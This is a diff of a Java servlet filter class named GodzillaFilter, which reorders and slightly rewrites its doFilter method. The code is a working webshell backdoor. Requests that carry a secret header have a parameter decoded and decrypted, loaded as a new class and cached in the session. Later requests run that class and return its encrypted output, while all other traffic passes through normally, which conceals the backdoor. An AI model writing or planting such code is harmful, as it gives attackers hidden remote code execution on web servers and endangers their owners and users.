@@ -26,6 +26,37 @@ public class GodzillaFilter extends ClassLoader implements Filter {
         super(z);
     }
 
+    @Override
+    @SuppressWarnings("all")
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        try {
+            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
+                HttpSession session = request.getSession();
+                byte[] data = base64Decode(request.getParameter(pass));
+                data = this.x(data, false);
+                if (session.getAttribute("payload") == null) {
+                    session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
+                } else {
+                    request.setAttribute("parameters", data);
+                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
+                    f.equals(arrOut);
+                    f.equals(request);
+                    response.getWriter().write(md5.substring(0, 16));
+                    f.toString();
+                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                    response.getWriter().write(md5.substring(16));
+                }
+            } else {
+                chain.doFilter(servletRequest, servletResponse);
+            }
+        } catch (Exception e) {
+            chain.doFilter(servletRequest, servletResponse);
+        }
+    }
+
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
         String value = null;
@@ -77,42 +108,6 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             return c.doFinal(s);
         } catch (Exception var4) {
             return null;
-        }
-    }
-
-    @Override
-    @SuppressWarnings("all")
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
-        HttpServletRequest request = (HttpServletRequest) servletRequest;
-        HttpServletResponse response = (HttpServletResponse) servletResponse;
-        try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
-                byte[] data = base64Decode(request.getParameter(pass));
-                data = this.x(data, false);
-                if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
-                } else {
-                    request.setAttribute("parameters", data);
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f;
-                    try {
-                        f = ((Class<?>) session.getAttribute("payload")).newInstance();
-                    } catch (Exception e) {
-                        throw new RuntimeException(e);
-                    }
-                    f.equals(arrOut);
-                    f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
-                    f.toString();
-                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
-                    response.getWriter().write(md5.substring(16));
-                }
-            } else {
-                chain.doFilter(servletRequest, servletResponse);
-            }
-        } catch (Exception e) {
-            chain.doFilter(servletRequest, servletResponse);
         }
     }
 
